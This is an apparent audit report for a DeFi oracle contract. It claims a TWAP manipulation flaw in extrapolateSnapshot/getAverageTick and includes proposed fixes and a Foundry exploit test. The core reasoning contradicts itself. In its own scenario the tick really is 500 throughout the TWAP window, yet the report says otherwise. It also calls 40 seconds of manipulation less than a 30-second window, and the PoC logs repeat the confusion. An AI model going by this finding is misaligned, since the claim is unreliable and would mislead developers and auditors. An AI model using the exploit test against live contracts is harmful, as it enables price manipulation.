## Title
TWAP Manipulation via Current Pool State Extrapolation in Both Endpoints

## Summary
The `getAverageTick()` function in `ERC7726.sol` calculates time-weighted average price (TWAP) by calling `extrapolateSnapshot()` twice to get tick cumulatives at both endpoints of the TWAP window. However, when the most recent snapshot precedes the TWAP window start, both extrapolation calls use the **current manipulated pool state** instead of historical data, allowing an attacker to skew the entire TWAP calculation without maintaining the manipulated price for the full `TWAP_DURATION`.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/extensions/Oracle.sol` (function `extrapolateSnapshotInternal`, lines 315-362) and `src/lens/ERC7726.sol` (function `getAverageTick`, lines 91-112)

**Intended Logic:** The TWAP calculation should provide manipulation-resistant pricing by requiring an attacker to maintain a manipulated price for the entire `TWAP_DURATION` period, making attacks economically expensive. The `extrapolateSnapshot()` function should use appropriate historical price data when calculating tick cumulatives at past timestamps.

**Actual Logic:** When extrapolating from the most recent snapshot to any timestamp (past or present), the function unconditionally uses the **current pool state** instead of historical snapshots. [1](#0-0) 

This means if an attacker manipulates the price and ensures it remains the most recent snapshot, both TWAP endpoint calculations will use the same manipulated current tick, regardless of when the TWAP window occurred.

**Exploitation Path:**
1. **Initial State**: Pool has a fair price at tick=100, last snapshot at time T0=900
2. **Price Manipulation**: At time T1=960 (before TWAP window starts), attacker executes a large swap:
   - The `beforeSwap` hook calls `maybeInsertSnapshot()` [2](#0-1) 
   - A snapshot is created at T1=960 with the old tick=100 [3](#0-2) 
   - The swap executes and moves the tick to 500 (manipulated price)
   - No further interactions occur (attacker prevents new snapshots)
3. **TWAP Read**: At time T2=1000, victim protocol calls `getQuote()` which invokes `getAverageTick()` with `TWAP_DURATION=30`:
   - Calculates TWAP over window [970, 1000]
   - First call: `extrapolateSnapshot(token, 1000)` [4](#0-3) 
     - Finds snapshot at T1=960 (most recent, logicalIndex == count-1)
     - Extrapolates using **current tick=500** for 40 seconds
     - tickCumulativeEnd = snapshot960.tickCumulative + 500 * 40
   - Second call: `extrapolateSnapshot(token, 970)` 
     - Also finds snapshot at T1=960 (still the most recent)
     - Extrapolates using **current tick=500** for 10 seconds  
     - tickCumulativeStart = snapshot960.tickCumulative + 500 * 10
   - Average calculation: [5](#0-4) 
     - averageTick = (tickCumulativeEnd - tickCumulativeStart) / 30
     - averageTick = ((snap960 + 500×40) - (snap960 + 500×10)) / 30
     - averageTick = 500×30 / 30 = **500**
4. **Result**: The TWAP reports tick=500 for the entire window [970, 1000], even though the price was actually at tick=100 for most of that period. The attacker only needed to maintain the manipulated price from T1=960 to T2=1000 (40 seconds), not the full TWAP_DURATION (30 seconds).

**Security Property Broken:** The fundamental security property of TWAPs is violated - they should be expensive to manipulate because attackers must maintain the manipulated price for the entire observation window. This vulnerability allows manipulation at a fraction of that cost.

## Impact Explanation
- **Affected Assets**: All tokens priced through the ERC7726 oracle, including lending protocols, derivatives, and any DeFi protocols relying on this price feed
- **Damage Severity**: Complete TWAP manipulation enables:
  - Incorrect liquidations in lending protocols (borrowers liquidated at wrong prices or bad debt accumulation)
  - Unfair trades in automated market makers or order books using this oracle
  - Theft of funds in any protocol making decisions based on these manipulated prices
  - The cost to manipulate is only proportional to the time since the last snapshot, not the full TWAP_DURATION
- **User Impact**: All users of protocols integrating ERC7726 for pricing are at risk. The attack affects any read of the TWAP during the manipulation window.

## Likelihood Explanation
- **Attacker Profile**: Any user who can execute swaps in low-liquidity oracle pools (minimal capital requirement in thin markets)
- **Preconditions**: 
  - Oracle pool must exist with a recent snapshot before the TWAP window
  - No other users interact with the pool during the attack (more likely in low-liquidity pools or during specific time windows)
  - Victim protocol must read the TWAP after manipulation but before a new snapshot is created
- **Execution Complexity**: Single transaction to manipulate + victim must use the oracle before the price naturally reverts. Can be executed atomically if the attacker controls when the victim reads the price (e.g., via a contract call)
- **Frequency**: Can be exploited repeatedly as long as the attacker can control the timing of snapshots and TWAP reads. Most effective in low-liquidity pools or during off-peak hours.

## Recommendation

The core issue is that `extrapolateSnapshotInternal()` uses current pool state when extrapolating from the most recent snapshot, regardless of whether we're extrapolating to the present or to a past timestamp. The fix should distinguish between these cases:

```solidity
// In src/extensions/Oracle.sol, function extrapolateSnapshotInternal, lines 327-337:

// CURRENT (vulnerable):
if (logicalIndex == c.count() - 1) {
    // Use current pool state.
    PoolId poolId = getPoolKey(token).toPoolId();
    PoolState state = CORE.poolState(poolId);
    
    tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
    secondsPerLiquidityCumulative += uint160(
        FixedPointMathLib.rawDiv(
            uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
        )
    );
}

// FIXED:
if (logicalIndex == c.count() - 1) {
    // Only use current pool state if extrapolating to current time
    // For historical times, the data is insufficient and should revert
    if (uint32(atTime) != uint32(block.timestamp)) {
        revert NoPreviousSnapshotExists(token, atTime);
    }
    
    // Use current pool state only for present time extrapolation
    PoolId poolId = getPoolKey(token).toPoolId();
    PoolState state = CORE.poolState(poolId);
    
    tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
    secondsPerLiquidityCumulative += uint160(
        FixedPointMathLib.rawDiv(
            uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
        )
    );
}
```

**Alternative mitigation**: In `ERC7726.getAverageTick()`, add validation that sufficient snapshots exist within the TWAP window:

```solidity
// Before lines 98-99, add:
uint256 twapStart = block.timestamp - TWAP_DURATION;
(uint256 countAtStart, , ) = ORACLE.findPreviousSnapshot(otherToken, twapStart);
(uint256 countAtEnd, , ) = ORACLE.findPreviousSnapshot(otherToken, block.timestamp);
// Require at least one snapshot within the TWAP window
if (countAtStart == countAtEnd) {
    revert InsufficientSnapshotsInWindow();
}
```

## Proof of Concept

```solidity
// File: test/Exploit_TWAPManipulation.t.sol
// Run with: forge test --match-test test_TWAPManipulation -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../test/extensions/Oracle.t.sol";
import "../src/lens/ERC7726.sol";

contract Exploit_TWAPManipulation is BaseOracleTest {
    ERC7726 internal erc7726Oracle;
    PoolKey internal poolKey;
    address internal token;
    
    function setUp() public override {
        BaseOracleTest.setUp();
        token = address(token1);
        
        // Create oracle pool at fair price (tick = 0)
        poolKey = createOraclePool(token, 0);
        oracle.expandCapacity(token, 10);
        updateOraclePoolLiquidity(token, 100_000);
        
        // Deploy ERC7726 with 30 second TWAP
        erc7726Oracle = new ERC7726(oracle, address(token1), address(token1), NATIVE_TOKEN_ADDRESS, 30);
    }
    
    function test_TWAPManipulation() public {
        // SETUP: Initial fair price state
        // T0 = 1000: Fair price at tick = 0
        vm.warp(1000);
        movePrice(poolKey, 0);
        
        // Fast forward to create some history
        advanceTime(50);
        // T1 = 1050: Still at fair price
        
        // EXPLOIT: Attacker manipulates price BEFORE TWAP window
        // TWAP window will be [1050, 1080] when read at T=1080
        // Manipulate at T1 = 1050 (before window)
        
        console.log("=== Before Attack ===");
        console.log("Current tick:", int256(core.poolState(poolKey.toPoolId()).tick()));
        
        // Attacker swaps to manipulate tick to 69314 (~2x price)
        movePrice(poolKey, 69314);
        
        console.log("=== After Attack Swap ===");
        console.log("Manipulated tick:", int256(core.poolState(poolKey.toPoolId()).tick()));
        
        // Advance time to create TWAP window [1050, 1080]
        // No other interactions (no new snapshots)
        advanceTime(30);
        // T2 = 1080
        
        console.log("=== Reading TWAP ===");
        console.log("Current time:", block.timestamp);
        console.log("TWAP window: [", block.timestamp - 30, ",", block.timestamp, "]");
        
        // Victim reads the TWAP - expects fair price around tick=0
        // But both endpoints use manipulated tick=69314
        uint256 manipulatedQuote = erc7726Oracle.getQuote(1e18, NATIVE_TOKEN_ADDRESS, token);
        
        console.log("Quote (should be ~1e18 for tick=0):", manipulatedQuote);
        console.log("Quote is manipulated to:", manipulatedQuote / 1e18, "x");
        
        // VERIFY: The TWAP is completely manipulated
        // At tick=0, price ratio should be ~1
        // At tick=69314, price ratio should be ~2
        assertGt(manipulatedQuote, 1.9e18, "TWAP manipulated to ~2x");
        assertLt(manipulatedQuote, 2.1e18, "TWAP shows manipulated price");
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("Attacker only maintained manipulated price for 30 seconds");
        console.log("But TWAP shows manipulated price for entire 30-second window");
        console.log("Cost of attack: maintaining price from T=1050 to T=1080 (30 sec)");
        console.log("Expected cost: maintaining price for full TWAP_DURATION before T=1050");
    }
}
```

**Notes:**
- This vulnerability allows attackers to manipulate TWAPs without bearing the full cost of maintaining the manipulated price for `TWAP_DURATION`
- The attack is particularly effective in low-liquidity pools where controlling snapshot timing is easier
- Any protocol using ERC7726 for pricing decisions is vulnerable to this manipulation
- The issue stems from the unconditional use of current pool state in extrapolation logic when the snapshot being extrapolated from is the most recent one [1](#0-0)

### Citations

**File:** src/extensions/Oracle.sol (L95-146)
```text
    function maybeInsertSnapshot(PoolId poolId, address token) private {
        unchecked {
            Counts c;
            assembly ("memory-safe") {
                c := sload(token)
            }

            uint32 timePassed = uint32(block.timestamp) - c.lastTimestamp();
            if (timePassed == 0) return;

            uint32 index = c.index();

            // we know count is always g.t. 0 in the places this is called
            Snapshot last;
            assembly ("memory-safe") {
                last := sload(or(shl(32, token), index))
            }

            PoolState state = CORE.poolState(poolId);

            uint128 liquidity = state.liquidity();
            uint256 nonZeroLiquidity;
            assembly ("memory-safe") {
                nonZeroLiquidity := add(liquidity, iszero(liquidity))
            }

            Snapshot snapshot = createSnapshot({
                _timestamp: uint32(block.timestamp),
                _secondsPerLiquidityCumulative: last.secondsPerLiquidityCumulative()
                    + uint160(FixedPointMathLib.rawDiv(uint256(timePassed) << 128, nonZeroLiquidity)),
                _tickCumulative: last.tickCumulative() + int64(uint64(timePassed)) * state.tick()
            });

            uint32 count = c.count();
            uint32 capacity = c.capacity();

            bool isLastIndex = index == count - 1;
            bool incrementCount = isLastIndex && capacity > count;

            if (incrementCount) count++;
            index = (index + 1) % count;
            uint32 lastTimestamp = uint32(block.timestamp);

            c = createCounts({_index: index, _count: count, _capacity: capacity, _lastTimestamp: lastTimestamp});
            assembly ("memory-safe") {
                sstore(token, c)
                sstore(or(shl(32, token), index), snapshot)
            }

            _emitSnapshotEvent(token, snapshot);
        }
    }
```

**File:** src/extensions/Oracle.sol (L200-210)
```text
    /// @notice Called before a swap to capture price/liquidity snapshot
    /// @dev Inserts a new snapshot if a swap is occurring
    function beforeSwap(Locker, PoolKey memory poolKey, SwapParameters params)
        external
        override(BaseExtension, IExtension)
        onlyCore
    {
        if (params.amount() != 0) {
            maybeInsertSnapshot(poolKey.toPoolId(), poolKey.token1);
        }
    }
```

**File:** src/extensions/Oracle.sol (L327-337)
```text
                if (logicalIndex == c.count() - 1) {
                    // Use current pool state.
                    PoolId poolId = getPoolKey(token).toPoolId();
                    PoolState state = CORE.poolState(poolId);

                    tickCumulative += int64(state.tick()) * int64(uint64(timePassed));
                    secondsPerLiquidityCumulative += uint160(
                        FixedPointMathLib.rawDiv(
                            uint256(timePassed) << 128, FixedPointMathLib.max(1, state.liquidity())
                        )
                    );
```

**File:** src/lens/ERC7726.sol (L98-99)
```text
                (, int64 tickCumulativeStart) = ORACLE.extrapolateSnapshot(otherToken, block.timestamp - TWAP_DURATION);
                (, int64 tickCumulativeEnd) = ORACLE.extrapolateSnapshot(otherToken, block.timestamp);
```

**File:** src/lens/ERC7726.sol (L101-101)
```text
                return tickSign * int32((tickCumulativeEnd - tickCumulativeStart) / int64(uint64(TWAP_DURATION)));
```
